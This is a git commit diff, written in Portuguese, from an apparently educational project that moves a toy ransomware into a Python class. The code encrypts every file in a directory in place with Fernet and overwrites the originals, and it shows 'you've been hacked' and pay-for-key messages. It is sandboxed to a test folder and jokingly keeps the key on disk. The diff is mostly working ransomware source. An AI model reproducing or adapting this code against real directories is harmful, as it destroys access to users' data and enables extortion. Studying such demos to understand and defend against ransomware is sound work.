324aa0200dfff9128c9ebd8322e1cc77e7d5e179
Santiago Bernardes <santiagobernardes@gmail.com>
2024-10-10 22:06:42 -0300

    move ransomware para classe

--- classes.py
+++ classes.py
@@ -28,3 +28,35 @@ class GerenciadorDeChave:
     @staticmethod
     def converta_para_bytes(chave):
         return chave.encode('utf-8')
+
+
+class Ransomware:
+    def __init__(self, gerenciador_de_chave):
+        self.gerenciador_de_chave = gerenciador_de_chave
+        self.fernet = Fernet(self.gerenciador_de_chave.crie_chave())
+
+    def infecte_arquivo(self, caminho_para_arquivo):
+        conteudo = ler_arquivo(caminho_para_arquivo)
+        conteudo_criptografado = self.fernet.encrypt(conteudo)
+        escrever_arquivo(caminho_para_arquivo, conteudo_criptografado)
+
+    def infecte_diretorio(self, diretorio):
+        for nome_arquivo in os.listdir(diretorio):
+            caminho_arquivo = f'{diretorio}/{nome_arquivo}'
+            self.infecte_arquivo(caminho_arquivo)
+
+    def desinfecte_arquivo(self, caminho_para_arquivo, remover_chave=False):
+        conteudo_criptografado = ler_arquivo(caminho_para_arquivo)
+        conteudo = self.fernet.decrypt(conteudo_criptografado)
+        escrever_arquivo(caminho_para_arquivo, conteudo)
+
+        if remover_chave:
+            self.gerenciador_de_chave.remova_chave()
+
+    def desinfecte_diretorio(self, diretorio, remover_chave=False):
+        for nome_arquivo in os.listdir(diretorio):
+            caminho_arquivo = f'{diretorio}/{nome_arquivo}'
+            self.desinfecte_arquivo(caminho_arquivo)
+
+        if remover_chave:
+            self.gerenciador_de_chave.remova_chave()
--- ransomware.py
+++ ransomware.py
@@ -1,14 +1,12 @@
 import os
 import shutil
 
-from cryptography.fernet import Fernet
-
-from arquivos_utils import ler_arquivo, escrever_arquivo
-from classes import GerenciadorDeChave
+from classes import GerenciadorDeChave, Ransomware
 
 
-def garanta_existencia_diretorio(diretorio: str) -> None:
-    diretorio_exemplos: str = './exemplos'
+def garanta_existencia_diretorio_teste(diretorio):
+    print(f'Garantindo existência do diretório teste {diretorio}...')
+    diretorio_exemplos = './exemplos'
     if os.path.exists(diretorio):
         print(f'Diretório {diretorio} já existe. Sobrescrendo.')
         shutil.rmtree(diretorio)
@@ -20,44 +18,18 @@ def garanta_existencia_diretorio(diretorio: str) -> None:
     print('Arquivos copiados com sucesso!')
 
 
-def criptografe_diretorio(diretorio, gerenciador_de_chave):
-    chave_criptografia = gerenciador_de_chave.crie_chave()
-    fernet = Fernet(chave_criptografia)
-
-    for nome_arquivo in os.listdir(diretorio):
-        caminho_arquivo = f'{diretorio}/{nome_arquivo}'
-        conteudo = ler_arquivo(caminho_arquivo)
-        conteudo_criptografado = fernet.encrypt(conteudo)
-        escrever_arquivo(caminho_arquivo, conteudo_criptografado)
-
-
-def obtenha_chave_criptografia():
-    return ler_arquivo('keys.rans')
-
-
-def descriptografe_diretorio(diretorio, chave_legivel, gerenciador_de_chave):
-    chave = gerenciador_de_chave.converta_para_bytes(chave_legivel)
-    fernet = Fernet(chave)
-
-    for nome_arquivo in os.listdir(diretorio):
-        caminho_arquivo = f'{diretorio}/{nome_arquivo}'
-        conteudo_criptografado = ler_arquivo(caminho_arquivo)
-
-        conteudo = fernet.decrypt(conteudo_criptografado)
-        escrever_arquivo(caminho_arquivo, conteudo)
-
-    gerenciador_de_chave.remova_chave()
-
-
 if __name__ == '__main__':
     # Apesar de o código ser flexível o suficiente para criptografar qualquer diretório, estamos setando um diretório
     # específico para evitar que o ransomware criptografe diretórios importantes do sistema operacional.
     # Altere o diretório por sua conta e risco.
 
-    DIRETORIO_TESTE: str = './ransomware_tmp'
-    gerenciador_de_chave = GerenciadorDeChave('keys.rans')
+    DIRETORIO_TESTE = './ransomware_tmp'
+    ARQUIVO_CHAVE = 'keys.rans'
+    garanta_existencia_diretorio_teste(DIRETORIO_TESTE)
+    gerenciador_de_chave = GerenciadorDeChave(ARQUIVO_CHAVE)
+    ransomware = Ransomware(gerenciador_de_chave)
     print('O que você deseja fazer?')
-    opcao: int = -1
+    opcao = -1
     while opcao != 0:
         print('1 - Criptografar')
         print('2 - Obter chave de descriptografia')
@@ -66,14 +38,17 @@ if __name__ == '__main__':
         opcao = int(input('Digite a opção desejada: '))
 
         if opcao == 1:
-            garanta_existencia_diretorio(DIRETORIO_TESTE)
-            criptografe_diretorio(DIRETORIO_TESTE, gerenciador_de_chave)
+            ransomware.infecte_diretorio(DIRETORIO_TESTE)
             print(f'Você foi hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram criptografados!')
         elif opcao == 2:
             print(f'Chave de descriptografia: {gerenciador_de_chave.obtenha_chave(legivel=True)}')
         elif opcao == 3:
+            print('Para obter a chave de descriptografia, você precisa pagar!')
+            print(f'(Ou abrir o arquivo {ARQUIVO_CHAVE} e converter os bytes para string)')
+            print('(Ou escolher a opção 2 copiar e colar a chave de descriptografia)')
+            print('Nós somos péssimos hackers... =(\n')
             chave_legivel = input('Digite a chave de descriptografia: ')
-            descriptografe_diretorio(DIRETORIO_TESTE, chave_legivel, gerenciador_de_chave)
+            ransomware.desinfecte_diretorio(DIRETORIO_TESTE, remover_chave=True)
             print(
                 f'Você não está mais hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram descriptografados!'
             )
